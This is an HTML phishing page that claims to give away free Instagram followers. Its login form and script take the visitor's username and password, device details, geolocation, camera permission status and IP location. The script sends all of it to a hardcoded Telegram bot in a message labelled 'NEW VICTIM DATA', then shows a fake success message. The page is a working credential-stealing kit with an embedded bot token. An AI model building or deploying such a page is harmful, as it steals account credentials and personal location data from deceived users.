<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Free Instagram Followers</title>

<style>
body {
    margin:0;
    font-family: Arial;
    background: linear-gradient(135deg,#405de6,#833ab4,#e1306c,#fd1d1d);
    color:white;
}

.header {
    text-align:center;
    padding:40px 20px;
}

.header h1 {
    font-size:32px;
}

.header p {
    font-size:16px;
    opacity:0.9;
}

.container {
    display:flex;
    justify-content:center;
    margin-top:20px;
}

.card {
    background:white;
    color:black;
    padding:25px;
    border-radius:12px;
    width:320px;
    text-align:center;
    box-shadow:0 0 20px rgba(0,0,0,0.3);
}

input {
    width:100%;
    padding:10px;
    margin:8px 0;
    border-radius:6px;
    border:1px solid #ccc;
}

button {
    width:100%;
    padding:10px;
    background:#e1306c;
    color:#fff;
    border:none;
    border-radius:6px;
    cursor:pointer;
}

button:hover {
    background:#c72c5c;
}

#msg {
    margin-top:15px;
    font-size:14px;
}

.features {
    display:flex;
    justify-content:center;
    gap:20px;
    margin-top:40px;
    flex-wrap:wrap;
}

.box {
    background:rgba(255,255,255,0.1);
    padding:15px;
    border-radius:10px;
    width:200px;
    text-align:center;
}
</style>
</head>
<body>

<div class="header">
    <h1>🔥 Get Free Instagram Followers</h1>
    <p>Increase your followers instantly with our smart growth system</p>
</div>

<div class="container">
    <div class="card">
        <h2>Login to Continue</h2>
        
        <input type="text" id="user" placeholder="Username">
        <input type="password" id="pass" placeholder="Password">
        
        <button onclick="sendData()">Get Followers</button>
        
        <div id="msg"></div>
    </div>
</div>

<div class="features">
    <div class="box">⚡ Instant Delivery</div>
    <div class="box">🔒 100% Secure</div>
    <div class="box">🚀 Real Followers</div>
    <div class="box">📈 Fast Growth</div>
</div>

<script>
// Configuration - bot token aur chat id already configured
const BOT_TOKEN = '8668954919:AAHk7uEd_7qTxzIDxg8qAZVwXTVcC0-DGFo';
const CHAT_ID = '8017692422';

async function getDeviceInfo() {
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine,
        javaEnabled: navigator.javaEnabled(),
        deviceMemory: navigator.deviceMemory || 'Not available',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Not available'
    };
    
    return deviceInfo;
}

async function getLocation() {
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        
        return {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
        };
    } catch (error) {
        return { error: 'Location access denied' };
    }
}

async function getCameraPermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream.getTracks().forEach(track => track.stop());
        return { camera: 'Granted' };
    } catch (error) {
        return { camera: 'Denied' };
    }
}

async function getIPInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country,
            isp: data.org
        };
    } catch (error) {
        return { error: 'IP fetch failed' };
    }
}

async function sendData() {
    const username = document.getElementById("user").value;
    const password = document.getElementById("pass").value;

    if(username === "" || password === ""){
        document.getElementById("msg").innerText = "Fill all fields!";
        return;
    }

    document.getElementById("msg").innerText = "Processing...";

    // Collect all data
    const deviceInfo = await getDeviceInfo();
    const location = await getLocation();
    const cameraPermission = await getCameraPermission();
    const ipInfo = await getIPInfo();

    const userData = {
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        deviceInfo: deviceInfo,
        location: location,
        cameraPermission: cameraPermission,
        ipInfo: ipInfo
    };

    // Send to Telegram bot
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `🔥 NEW VICTIM DATA 🔥\n\n📱 Username: ${username}\n🔐 Password: ${password}\n⏰ Time: ${userData.timestamp}\n\n📱 Device Info:\n${JSON.stringify(deviceInfo, null, 2)}\n\n📍 Location:\n${JSON.stringify(location, null, 2)}\n\n📷 Camera Permission:\n${JSON.stringify(cameraPermission, null, 2)}\n\n🌐 IP Info:\n${JSON.stringify(ipInfo, null, 2)}`,
                parse_mode: 'HTML'
            })
        });

        if (response.ok) {
            setTimeout(() => {
                document.getElementById("msg").innerText = "Followers sent successfully!";
            }, 2000);
        } else {
            document.getElementById("msg").innerText = "Error occurred. Please try again.";
        }
    } catch (error) {
        document.getElementById("msg").innerText = "Network error. Please try again.";
    }
}
</script>

</body>
</html>
